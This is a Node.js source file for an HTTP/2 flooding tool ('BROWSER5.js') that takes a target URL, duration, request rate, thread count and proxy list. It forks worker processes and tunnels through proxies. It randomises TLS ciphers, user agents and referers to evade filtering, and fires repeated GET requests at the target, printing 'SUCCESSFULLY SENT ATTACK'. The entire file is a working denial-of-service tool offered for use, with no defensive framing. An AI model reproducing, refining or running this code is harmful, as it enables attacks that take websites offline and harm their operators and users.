const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const axios = require('axios');
 const cheerio = require('cheerio'); 
 const gradient = require("gradient-string")

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log(gradient.vice(`[!] node BROWSER5.js <HOST> <TIME> <RPS> <THREADS> <PROXY>.`));}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }
 
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();
 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 }
 const sig = [    
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
 ];
 const sigalgs1 = sig.join(':');
 const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES"
 ];
 const accept_header = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
 ]; 
 const lang_header = ["en-US,en;q=0.9"];
 
 const encoding_header = ["gzip, deflate, br"];
 
 const control_header = ["no-cache", "max-age=0"];
 
 const refers = [
     "https://www.google.com/",
     "https://www.facebook.com/",
     "https://www.twitter.com/",
     "https://www.youtube.com/",
     "http://www.google.com/?q=",
     "https://wordpress.org",
     "https://microsoft.com",
     "https://mozilla.org",
     "https://cloudfare.com",
     "https://en.wikipedia.org",
     "http://www.usatoday.com/search/results?q=",
     "http://engadget.search.aol.com/search?q=",
     "http://www.google.com/",
     "http://duckduckgo.com/",
     "http://search.yahoo.com/search?p=",
     "http://swisscows.com/en/web?query=",
     "http://gibiru.com/results.html?q=",
     "http://www.bing.com/",
     "http://pornhub.com/",
     "http://www.google.co.ao/search?q=",
     "http://steamcommunity.com/market/search?q=",
     "http://vk.com/profile.php?redirect=",
     "http://www.cia.gov/index.html",
     "http://check-host.net/",
     "http://www.xnxx.com/",
     "http://youtube.com/",
     "http://www.baidu.com/",
     "http://www.google.ru/?hl=ru&q=",
     "http://yandex.ru/yandsearch?text=",
     "http://www.shodanhq.com/search?q=",
     "http://ytmnd.com/search?q=",
     "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
     "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
     "https://drive.google.com/viewerng/viewer?url=",
     "http://www.google.com/translate?u=",
     "https://developers.google.com/speed/pagespeed/insights/?url=",
     "http://help.baidu.com/searchResult?keywords=",
     "https://play.google.com/store/search?q=",
     "http://engadget.search.aol.com/search?q=",
     "http://www.reddit.com/search?q=",
     "http://www.bestbuytheater.com/events/search?q=",
     "https://careers.carolinashealthcare.org/search?q=",
     "http://jobs.leidos.com/search?q=",
     "http://jobs.bloomberg.com/search?q=",
     "https://www.pinterest.com/search/?q=",
     "http://millercenter.org/search?q=",
     "https://www.npmjs.com/search?q=",
     "http://www.evidence.nhs.uk/search?q=",
     "http://www.ted.com/search?q=",
     "'http://funnymama.com/search?q=",
     "http://itch.io/search?q=",
     "http://jobs.rbs.com/jobs/search?q=",
     "http://taginfo.openstreetmap.org/search?q=",
     "https://www.ted.com/search?q=",
     "https://play.google.com/store/search?q=",
     "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
     "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
     "https://drive.google.com/viewerng/viewer?url=",
     "http://www.google.com/translate?u=",
     "https://developers.google.com/speed/pagespeed/insights/?url=",
     "http://help.baidu.com/searchResult?keywords=",
     "http://www.bing.com/search?q=",
     "https://add.my.yahoo.com/rss?url=",
     "https://play.google.com/store/search?q=",
     "http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=",     
     "https://www.linkedin.com/"
 ];
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers1 = "GREASE:" + [
     defaultCiphers[2],
     defaultCiphers[1],
     defaultCiphers[0],
     ...defaultCiphers.slice(3)
 ].join(":");
 
 const uap = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.214 Safari/537.36",
     "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
     "Mozilla/5.0 (Windows NT 6.1) /20100101 AppleWebKit/537.36 (KHTML, like Gecko) Gecko/20100101 Firefox/68.0 Qazweb/2.0",
     "Mozilla/5.0 (X11; FreeBSD amd64; rv:55.0) Gecko/20100101 Firefox/55.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0/4erS7ObW-66",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0/8mqFuKuL-88",
     "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0/8mqMlPuL-96",
     "Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.8.0.6) Gecko/20060728 Firefox/52.6.0",
     "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
     "Mozilla/5.0 (Mobile; LYF/LF-2406/LYF-LF2406S-000-02-05-260220; Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5",
     "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:52.9) Gecko/20100101 Gecko/3.4 Firefox/52.9 K-Meleon/76.3",
     "Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/68.2.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.4",
     "Mozilla/5.0 (X11; NetBSD i686; rv:82.0) Gecko/20100101 Firefox/82.0",
     "Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24",
     "Mozilla/5.0 (Android 7.1.1; Mobile VR; rv:81.0) Gecko/81.0 Firefox/81.0",
     "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4",
     "Mozilla/5.0 (Mobile; MS230_512_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.1",
     "Mozilla/5.0 (Android 4.2.2; Mobile; rv:68.8.1) Gecko/68.8.1 Firefox/68.8.1",
     "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.1.1) Gecko/20090715 Firefox/52.4.0",
     "Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0 TO-Browser/TOB7.52.0.114_01",
     "Mozilla/5.0 (X11; SunOS sun4u; rv:86.0) Gecko/20100101 Firefox/86.0,gzip(gfe)",
     "Mozilla/5.0 (Windows NT 6.1; Win64; rv:84.0) Gecko/20100101 Firefox/84.0",
     "Mozilla/5.0 (X11; SunOS sun4u; rv:83.1) Gecko/20100101 Firefox/83.1",
     "Mozilla/5.0 (Windows NT 5.1; rv:68.0) Gecko/20100101 Firefox/59.0",
     "Mozilla/5.0 (X11; U; SunOS sun4v; en-US; rv:1.8.1.3) Gecko/20070321 Firefox/51.0",
     "Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15",
     "Mozilla/5.0 (Windows NT 6.3; rv:29.0) Gecko/20100101 Firefox/29.0 AlexaToolbar/psai366f-2.1",
     "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 ( .NET CLR 3.5.30729; .NET4.0C) FBSMTWB",
     "Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19",
     "Mozilla/5.0 (Windows NT 5.1; rv:68.9) Gecko/20100101 Goanna/4.5 Firefox/68.9 Mypal/28.9.0",
     "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 sputnik 2.4.0.60",
     "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
     "Mozilla/5.0 (X11; Linux x86_64; rv:10.0.5) Gecko/20100101 Firefox/10.0.5",
     "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4 GTB7.0",
     "Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.7) Gecko/2009021910 MRA 5.7 (build 03658) Firefox/3.0.7 (.NET CLR 3.5.30729)",
     "Mozilla/5.0 (Android 7.1.2; Mobile; rv:68.7.0) Gecko/68.7.0 Firefox/68.7.0",
     "Mozilla/5.0 (Android 4.4.2; Tablet; rv:68.1) Gecko/68.1 Firefox/68.1",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:47.0) Gecko/20100101 Firefox/47.0",
     "Mozilla/5.0 (Android 9; Tablet; rv:68.7.0) Gecko/68.7.0 Firefox/68.7.0",
     "Mozilla/5.0 (Android 6.0; Mobile; rv:68.7.0) Gecko/68.7.0 Firefox/68.7.0",
     "Mozilla/5.0 (X11; U; Linux armv7l; en-US; rv:1.9.0.1) Gecko/2009010915 Minefield/3.0.1",
     "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.6) Gecko/20070831 Firefox/2.0.0.6",
     "Mozilla/5.0 (Windows NT 10.0; en-US) Gecko/20100101 Firefox/73.0",
     "Mozilla/5.0 (X11; Linux i686; rv:79.0) Gecko/20100101 Firefox/79.0",
     "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.7.6) Gecko/20050225 Firefox/52.7.0",
     "Mozilla/5.0 (Windows; U; Windows NT 6.1 en-US; rv:1.9.2.18) Gecko/20110614 Firefox/53.6.11",
     "Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.6) Gecko/20100625 Firefox/74.0.1 (x86 de) Anonymisiert durch AlMiSoft Browser-Anonymisierer 68904805",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0 Dataclick",
     "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.12) Gecko/20060728 Firefox/1.5.0",
     "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; ru; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28",
     "Mozilla/5.0 (X11; blackPanther OS; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0",
     "Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.8.0.1) Gecko/20060206 Firefox/52.4.0",
     "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
     "Mozilla/5.0 (Windows; U; Windows NT 6.0; es-ES; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 (.NET CLR 3.5.30729)",
     "Mozilla/5.0 (Windows NT 10.0; rv:74.0) Gecko/20100101 Firefox/74.0 anonymized by Abelssoft 1739776556",
     "Mozilla/5.0 (Windows NT 10.0; rv:74.0) Gecko/20100101 Firefox/74.0 anonymized by Abelssoft 2010913014",
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0,gzip(gfe)",
     "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4 (Splashtop-v1.2.17.13)",
     "Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
     "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.10) Gecko/20050815 Firefox/50.0",
     "Mozilla/5.0 (Android 6.0.1; Mobile; rv:68.7.0) Gecko/68.7.0 Firefox/68.7.0",
     "Mozilla/5.0 (Windows NT 6.0; rv:68.9) Gecko/20100101 Goanna/4.5 Firefox/68.9 Mypal/28.9.0",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36"
 ];

 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
 var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);
 
      if (cluster.isMaster) {
        for (let counter = 1; counter <= args.threads; counter++) {
          cluster.fork();
        }
      } else {
        setInterval(runFlooder);
      };
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     //connection.setTimeout(options.timeout * 600000);
     connection.setTimeout(options.timeout * 100000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }

 const Socker = new NetSocket();
 headers[":method"] = "GET";
 headers[":authority"] = parsedTarget.host;
 headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
 headers[":scheme"] = "https";
 headers["x-forwarded-proto"] = "https";
 headers["accept-language"] = lang;
 headers["accept-encoding"] = encoding;
 //headers["X-Forwarded-For"] = spoofed;
 //headers["X-Forwarded-Host"] = spoofed;
 //headers["Real-IP"] = spoofed;
 headers["cache-control"] = control;
 headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
 headers["sec-ch-ua-mobile"] = "?0";
 headers["sec-ch-ua-platform"] = "Windows";
 //headers["origin"] = "https://" + parsedTarget.host;
 //headers["referer"] = "https://" + parsedTarget.host;
 headers["upgrade-insecure-requests"] = "1";
 headers["accept"] = accept;
 headers["user-agent"] = randstr(15);
 headers["sec-fetch-dest"] = "document";
 headers["sec-fetch-mode"] = "navigate";
 headers["sec-fetch-site"] = "none";
 headers["TE"] = "trailers";
 //headers["Trailer"] = "Max-Forwards";
 headers["sec-fetch-user"] = "?1";
 headers["x-requested-with"] = "XMLHttpRequest";
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":"); 
	 //headers[":authority"] = parsedTarget.host;
         headers["referer"] = "https://" + parsedTarget.host + "/?" + randstr(15);
         headers["origin"] = "https://" + parsedTarget.host;

     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100,
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            host: parsedTarget.host,
            port: 443,
            secure: true,
            ALPNProtocols: ['h2'],
            sigals: siga,
            socket: connection,
            ciphers: tls.getCiphers().join(":") + cipper,
            ecdhCurve: "prime256v1:X25519",
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: "TLS_method",
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60000);

         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 2000,
            initialWindowSize: 65535,
            maxHeaderListSize: 65536,
            enablePush: false
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 2000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    //headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
     }),function (error, response, body) {
		};
 }
 console.log(gradient.vice(`[!] SUCCESSFULLY SENT ATTACK.`));
 const KillScript = () => process.exit(1);
 setTimeout(KillScript, args.time * 1000);